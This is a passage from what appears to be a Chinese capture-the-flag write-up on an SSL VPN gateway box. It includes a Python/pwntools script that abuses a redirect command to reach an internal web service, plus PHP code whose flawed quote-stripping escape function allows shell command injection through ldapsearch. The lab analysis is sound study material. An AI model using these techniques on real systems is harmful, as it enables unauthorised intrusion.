+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;"> SSL_read </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, v4, v13);
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  v23 = </span><span style="color:#8fa1b3;">send_data</span><span style="color:#c0c5ce;">(redirect_fd, buffer, v13);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<h3 id="jiao-hu">交互</h3><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">socket
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">ssl
+</span><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">MAJOR_COMMAND_AUTH </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0
+</span><span style="color:#bf616a;">MAJOR_COMMAND_LOG </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1
+</span><span style="color:#bf616a;">MAJOR_COMMAND_POLICY </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">2
+</span><span style="color:#bf616a;">MAJOR_COMMAND_SESSION </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">3
+</span><span style="color:#bf616a;">MAJOR_COMMAND_SET_REDIRECT_INFO </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">5
+</span><span style="color:#bf616a;">MAJOR_COMMAND_VPN_AUTH </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">6
+</span><span style="color:#bf616a;">MINOR_COMMAND_GET_VERSION </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">7
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">context.endianness = &#39;</span><span style="color:#a3be8c;">big</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#65737e;"># 服务器地址和端口
+</span><span style="color:#c0c5ce;">server_address = (&#39;</span><span style="color:#a3be8c;">192.168.101.140</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">45443</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># 客户端证书和私钥路径
+</span><span style="color:#c0c5ce;">client_cert = &#39;</span><span style="color:#a3be8c;">./toplayer.crt</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#c0c5ce;">client_key = &#39;</span><span style="color:#a3be8c;">./toplayer.key</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># 创建一个 TCP 套接字
+</span><span style="color:#c0c5ce;">sock = socket.</span><span style="color:#8fa1b3;">socket</span><span style="color:#c0c5ce;">(socket.</span><span style="color:#bf616a;">AF_INET</span><span style="color:#c0c5ce;">, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># 创建 SSL 上下文
+</span><span style="color:#c0c5ce;">context = ssl.</span><span style="color:#8fa1b3;">create_default_context</span><span style="color:#c0c5ce;">(ssl.Purpose.</span><span style="color:#bf616a;">SERVER_AUTH</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">context.</span><span style="color:#8fa1b3;">load_cert_chain</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">certfile</span><span style="color:#c0c5ce;">=client_cert, </span><span style="color:#bf616a;">keyfile</span><span style="color:#c0c5ce;">=client_key)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">context.check_hostname = </span><span style="color:#d08770;">False
+</span><span style="color:#c0c5ce;">context.verify_mode = ssl.</span><span style="color:#bf616a;">CERT_NONE
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">request = &#39;&#39;&#39;
+</span><span style="color:#a3be8c;">xxxx
+</span><span style="color:#c0c5ce;">&#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 通过 SSL 包装套接字并连接
+</span><span style="color:#c0c5ce;">    ssl_sock = context.</span><span style="color:#8fa1b3;">wrap_socket</span><span style="color:#c0c5ce;">(sock, </span><span style="color:#bf616a;">server_hostname</span><span style="color:#c0c5ce;">=server_address[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">])
+</span><span style="color:#c0c5ce;">    ssl_sock.</span><span style="color:#8fa1b3;">connect</span><span style="color:#c0c5ce;">(server_address)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">SSL 连接已建立。</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 发送明文数据
+</span><span style="color:#c0c5ce;">    message = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">SlSP</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#65737e;"># magic
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">28 </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># header length
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># tls client version
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># ssbp auth type
+</span><span style="color:#c0c5ce;">    message = message.</span><span style="color:#8fa1b3;">ljust</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># SWB
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># is_ipv6
+</span><span style="color:#c0c5ce;">    message = message.</span><span style="color:#8fa1b3;">ljust</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p16</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">MAJOR_COMMAND_SET_REDIRECT_INFO</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    message = message.</span><span style="color:#8fa1b3;">ljust</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">24</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">127.0.0.1:80</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">#message += b&#39;a&#39;*0xb0+b&#39;:&#39;
+</span><span style="color:#c0c5ce;">    ssl_sock.</span><span style="color:#8fa1b3;">sendall</span><span style="color:#c0c5ce;">(message)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">已发送数据: </span><span style="color:#c0c5ce;">{message}&quot;)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">input</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">paused</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># （可选）接收服务器响应
+</span><span style="color:#c0c5ce;">    ssl_sock.</span><span style="color:#8fa1b3;">sendall</span><span style="color:#c0c5ce;">(request.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">())
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">input</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">except </span><span style="color:#c0c5ce;">ssl.SSLError </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">e:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">SSL 错误: </span><span style="color:#c0c5ce;">{e}&quot;)
+</span><span style="color:#b48ead;">except </span><span style="color:#c0c5ce;">Exception </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">e:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">连接错误: </span><span style="color:#c0c5ce;">{e}&quot;)
+</span><span style="color:#b48ead;">finally</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">    ssl_sock.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">连接已关闭。</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span></pre>
+<h2 id="phpfen-xi">php分析</h2><p>内网有80端口开放
+<img src="./images/Pasted%20image%2020241212173546.png" alt="" /></p>
+<p>通过找nginx配置文件找到有php在<code>/var/www/html</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">game@box:~$ cat /etc/nginx/sites-available/default
+</span><span style="color:#c0c5ce;">##
+</span><span style="color:#c0c5ce;"># You should look at the following URL&#39;s in order to grasp a solid understanding
+</span><span style="color:#c0c5ce;"># of Nginx configuration files in order to fully unleash the power of Nginx.
+</span><span style="color:#c0c5ce;"># https://www.nginx.com/resources/wiki/start/
+</span><span style="color:#c0c5ce;"># https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
+</span><span style="color:#c0c5ce;"># https://wiki.debian.org/Nginx/DirectoryStructure
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;"># In most cases, administrators will remove this file from sites-enabled/ and
+</span><span style="color:#c0c5ce;"># leave it as reference inside of sites-available where it will continue to be
+</span><span style="color:#c0c5ce;"># updated by the nginx packaging team.
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;"># This file will automatically load configuration files provided by other
+</span><span style="color:#c0c5ce;"># applications, such as Drupal or Wordpress. These applications will be made
+</span><span style="color:#c0c5ce;"># available underneath a path with that package name, such as /drupal8.
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;"># Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
+</span><span style="color:#c0c5ce;">##
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;"># Default server configuration
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;">server {
+</span><span style="color:#c0c5ce;">        listen 127.0.0.1:80 default_server;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        # SSL configuration
+</span><span style="color:#c0c5ce;">        #
+</span><span style="color:#c0c5ce;">        # listen 443 ssl default_server;
+</span><span style="color:#c0c5ce;">        # listen [::]:443 ssl default_server;
+</span><span style="color:#c0c5ce;">        #
+</span><span style="color:#c0c5ce;">        # Note: You should disable gzip for SSL traffic.
+</span><span style="color:#c0c5ce;">        # See: https://bugs.debian.org/773332
+</span><span style="color:#c0c5ce;">        #
+</span><span style="color:#c0c5ce;">        # Read up on ssl_ciphers to ensure a secure configuration.
+</span><span style="color:#c0c5ce;">        # See: https://bugs.debian.org/765782
+</span><span style="color:#c0c5ce;">        #
+</span><span style="color:#c0c5ce;">        # Self signed certs generated by the ssl-cert package
+</span><span style="color:#c0c5ce;">        # Don&#39;t use them in a production server!
+</span><span style="color:#c0c5ce;">        #
+</span><span style="color:#c0c5ce;">        # include snippets/snakeoil.conf;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        root /var/www/html;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        # Add index.php to the list if you are using PHP
+</span><span style="color:#c0c5ce;">        index index.html index.htm index.nginx-debian.html index.php;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        server_name _;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        location / {
+</span><span style="color:#c0c5ce;">                # First attempt to serve request as file, then
+</span><span style="color:#c0c5ce;">                # as directory, then fall back to displaying a 404.
+</span><span style="color:#c0c5ce;">                try_files $uri $uri/ =404;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        # pass PHP scripts to FastCGI server
+</span><span style="color:#c0c5ce;">        #
+</span><span style="color:#c0c5ce;">        location ~ \.php$ {
+</span><span style="color:#c0c5ce;">                include snippets/fastcgi-php.conf;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">                # With php-fpm (or other unix sockets):
+</span><span style="color:#c0c5ce;">                fastcgi_pass unix:/run/php/php8.1-fpm.sock;
+</span><span style="color:#c0c5ce;">                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+</span><span style="color:#c0c5ce;">                include fastcgi_params;
+</span><span style="color:#c0c5ce;">                # With php-cgi (or other tcp sockets):
+</span><span style="color:#c0c5ce;">                #fastcgi_pass 127.0.0.1:9000;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        # deny access to .htaccess files, if Apache&#39;s document root
+</span><span style="color:#c0c5ce;">        # concurs with nginx&#39;s one
+</span><span style="color:#c0c5ce;">        #
+</span><span style="color:#c0c5ce;">        #location ~ /\.ht {
+</span><span style="color:#c0c5ce;">        #       deny all;
+</span><span style="color:#c0c5ce;">        #}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;"># Virtual Host configuration for example.com
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;"># You can move that to a different file under sites-available/ and symlink that
+</span><span style="color:#c0c5ce;"># to sites-enabled/ to enable it.
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;">#server {
+</span><span style="color:#c0c5ce;">#       listen 80;
+</span><span style="color:#c0c5ce;">#       listen [::]:80;
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;">#       server_name example.com;
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;">#       root /var/www/example.com;
+</span><span style="color:#c0c5ce;">#       index index.html;
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;">#       location / {
+</span><span style="color:#c0c5ce;">#               try_files $uri $uri/ =404;
+</span><span style="color:#c0c5ce;">#       }
+</span><span style="color:#c0c5ce;">#}
+</span></pre>
+<p><code>login.php</code> 略去html部分 <code>authenticate_user()</code>函数没require定义文件进来 有点抽象 调不到，要不这里应该也能直接注</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#ab7967;">&lt;?php
+</span><span style="color:#96b5b4;">error_reporting</span><span style="color:#c0c5ce;">(E_ERROR | E_PARSE);
+</span><span style="color:#96b5b4;">session_start</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">_SERVER</span><span style="color:#c0c5ce;">[&quot;</span><span style="color:#a3be8c;">REQUEST_METHOD</span><span style="color:#c0c5ce;">&quot;] == &quot;</span><span style="color:#a3be8c;">POST</span><span style="color:#c0c5ce;">&quot;) {
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">username </span><span style="color:#c0c5ce;">= $</span><span style="color:#bf616a;">_POST</span><span style="color:#c0c5ce;">[&#39;</span><span style="color:#a3be8c;">username</span><span style="color:#c0c5ce;">&#39;] ?? &#39;&#39;;
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">password </span><span style="color:#c0c5ce;">= $</span><span style="color:#bf616a;">_POST</span><span style="color:#c0c5ce;">[&#39;</span><span style="color:#a3be8c;">password</span><span style="color:#c0c5ce;">&#39;] ?? &#39;&#39;;
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#96b5b4;">empty</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">username</span><span style="color:#c0c5ce;">) &amp;&amp; !</span><span style="color:#96b5b4;">empty</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">password</span><span style="color:#c0c5ce;">)) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// Attempt LDAP authentication
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">result </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">authenticate_user</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">username</span><span style="color:#c0c5ce;">, $</span><span style="color:#bf616a;">password</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">result</span><span style="color:#c0c5ce;">[&#39;</span><span style="color:#a3be8c;">code</span><span style="color:#c0c5ce;">&#39;] === </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">            $</span><span style="color:#bf616a;">_SESSION</span><span style="color:#c0c5ce;">[&#39;</span><span style="color:#a3be8c;">user</span><span style="color:#c0c5ce;">&#39;] = $</span><span style="color:#bf616a;">username</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            $</span><span style="color:#bf616a;">_SESSION</span><span style="color:#c0c5ce;">[&#39;</span><span style="color:#a3be8c;">authenticated</span><span style="color:#c0c5ce;">&#39;] = </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">header</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Location: index.php</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">exit</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">            $</span><span style="color:#bf616a;">error_message </span><span style="color:#c0c5ce;">= $</span><span style="color:#bf616a;">result</span><span style="color:#c0c5ce;">[&#39;</span><span style="color:#a3be8c;">message</span><span style="color:#c0c5ce;">&#39;];
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#ab7967;">?&gt;
+</span></pre>
+<p><code>ldap_auth.php</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#ab7967;">&lt;?php
+</span><span style="color:#b48ead;">require_once</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">ldapTest.php</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">authenticate_user</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">username</span><span style="color:#c0c5ce;">, $</span><span style="color:#bf616a;">password</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// LDAP server configuration
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">server </span><span style="color:#c0c5ce;">= [
+</span><span style="color:#c0c5ce;">        &#39;</span><span style="color:#a3be8c;">host</span><span style="color:#c0c5ce;">&#39; =&gt; &#39;</span><span style="color:#a3be8c;">localhost</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#65737e;">// Change this to your LDAP server
+</span><span style="color:#c0c5ce;">        &#39;</span><span style="color:#a3be8c;">port</span><span style="color:#c0c5ce;">&#39; =&gt; &#39;</span><span style="color:#a3be8c;">389</span><span style="color:#c0c5ce;">&#39;,       </span><span style="color:#65737e;">// Change this to your LDAP port
+</span><span style="color:#c0c5ce;">        &#39;</span><span style="color:#a3be8c;">tls</span><span style="color:#c0c5ce;">&#39;  =&gt; </span><span style="color:#d08770;">false        </span><span style="color:#65737e;">// Set to true if using TLS
+</span><span style="color:#c0c5ce;">    ];
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// Base DN for user search
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">base_dn </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">dc=example,dc=com</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#65737e;">// Change this to your base DN
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// Create LDAP URL
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">url </span><span style="color:#c0c5ce;">= ($</span><span style="color:#bf616a;">server</span><span style="color:#c0c5ce;">[&#39;</span><span style="color:#a3be8c;">tls</span><span style="color:#c0c5ce;">&#39;] ? &quot;</span><span style="color:#a3be8c;">ldaps</span><span style="color:#c0c5ce;">&quot; : &quot;</span><span style="color:#a3be8c;">ldap</span><span style="color:#c0c5ce;">&quot;) . &quot;</span><span style="color:#a3be8c;">://{</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">server</span><span style="color:#a3be8c;">[</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">host</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">]}:{</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">server</span><span style="color:#a3be8c;">[</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">port</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">]}</span><span style="color:#c0c5ce;">&quot;;
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">url </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">escapeshellarg</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">url</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// Escape the username and password for shell usage
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">dn </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">base_dn</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">password </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">password</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// Use the test connection function from ldapTest.php
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">cmd </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">sprintf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">ldapsearch -x -H %s -D %s -w %s -b %s -s sub </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">(uid=%s)</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#c0c5ce;">&quot;,
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">url</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">dn</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">password</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">base_dn</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">escapeshellarg</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">username</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    );
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">result </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">shell_exec</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// Use the getResultMessage function from ldapTest.php to parse the result
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">getResultMessage</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">result</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p><code>ldapTest.php</code> 未鉴权 直接注，闭合单引号 #注释后续内容</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#ab7967;">&lt;?php
+</span><span style="color:#c0c5ce;">(...)
+</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">escapeshellarg_jp</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">p_arg</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">escape_flg </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">false</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">preg_match</span><span style="color:#c0c5ce;">(&quot;/^</span><span style="color:#96b5b4;">&#39;(.</span><span style="color:#c0c5ce;">*</span><span style="color:#96b5b4;">)&#39;</span><span style="color:#c0c5ce;">$/&quot;, $</span><span style="color:#bf616a;">p_arg</span><span style="color:#c0c5ce;">, $</span><span style="color:#bf616a;">matches</span><span style="color:#c0c5ce;">) === </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) { </span><span style="color:#65737e;">// 去掉包裹的单引号
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">p_arg </span><span style="color:#c0c5ce;">= $</span><span style="color:#bf616a;">matches</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    $</span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">= -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(++$</span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">p_arg</span><span style="color:#c0c5ce;">)) {
+</span><span style="color:#c0c5ce;">        $</span><span style="color:#bf616a;">char1byte </span><span style="color:#c0c5ce;">= $</span><span style="color:#bf616a;">p_arg</span><span style="color:#c0c5ce;">[$</span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">];
